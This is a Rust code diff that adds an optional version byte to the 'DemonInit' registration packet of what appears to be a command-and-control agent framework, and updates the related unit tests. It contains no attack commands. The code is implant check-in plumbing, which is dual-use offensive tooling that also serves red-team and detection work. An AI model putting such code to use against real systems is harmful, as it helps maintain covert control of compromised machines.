@@ -67,23 +67,28 @@ pub struct AgentMetadata {
 /// [ request_id(4) = 0 ]
 /// [ AES key (32 bytes, unencrypted) ]
 /// [ AES IV  (16 bytes, unencrypted) ]
+/// [ optional: 1-byte init secret version — present when `init_secret_version` is Some ]
 /// [ AES-256-CTR encrypted metadata payload ]
 /// ```
 pub fn build_init_packet(
     agent_id: u32,
     crypto: &AgentCryptoMaterial,
     metadata: &AgentMetadata,
+    init_secret_version: Option<u8>,
 ) -> Result<Vec<u8>, SpecterError> {
     let plaintext = serialize_init_metadata(agent_id, metadata)?;
     let encrypted = encrypt_agent_data(&crypto.key, &crypto.iv, &plaintext)?;
 
-    // Payload = command_id + request_id + key + iv + encrypted_metadata
-    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + encrypted.len();
+    let extra = usize::from(init_secret_version.is_some());
+    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + extra + encrypted.len();
     let mut payload = Vec::with_capacity(payload_len);
     payload.extend_from_slice(&u32::from(DemonCommand::DemonInit).to_be_bytes());
     payload.extend_from_slice(&0_u32.to_be_bytes()); // request_id = 0
     payload.extend_from_slice(&crypto.key);
     payload.extend_from_slice(&crypto.iv);
+    if let Some(version) = init_secret_version {
+        payload.push(version);
+    }
     payload.extend_from_slice(&encrypted);
 
     let envelope = DemonEnvelope::new(agent_id, payload)?;
@@ -363,7 +368,7 @@ mod tests {
         let crypto = generate_agent_crypto_material().expect("keygen");
         let agent_id = 0xAABB_CCDD;
         let metadata = test_metadata();
-        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");
+        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");
 
         // Parse the envelope
         let envelope = DemonEnvelope::from_bytes(&packet).expect("parse envelope");
@@ -382,7 +387,7 @@ mod tests {
         let crypto = generate_agent_crypto_material().expect("keygen");
         let agent_id = 0x1234_5678;
         let metadata = test_metadata();
-        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");
+        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");
 
         let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
         // After command_id(4) + request_id(4) comes key(32) + iv(16)
@@ -398,7 +403,7 @@ mod tests {
         let crypto = generate_agent_crypto_material().expect("keygen");
         let agent_id = 0xDEAD_CAFE;
         let metadata = test_metadata();
-        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");
+        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");
 
         let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
         let encrypted_start = 8 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH;
@@ -545,7 +550,7 @@ mod tests {
         let crypto = generate_agent_crypto_material().expect("keygen");
         let agent_id = 0x1234_5678;
         let metadata = test_metadata();
-        let packet = build_init_packet(agent_id, &crypto, &metadata).expect("build");
+        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");
 
         // First 4 bytes = size (BE), which equals total_len - 4
         let declared_size = u32::from_be_bytes(packet[0..4].try_into().expect("size"));
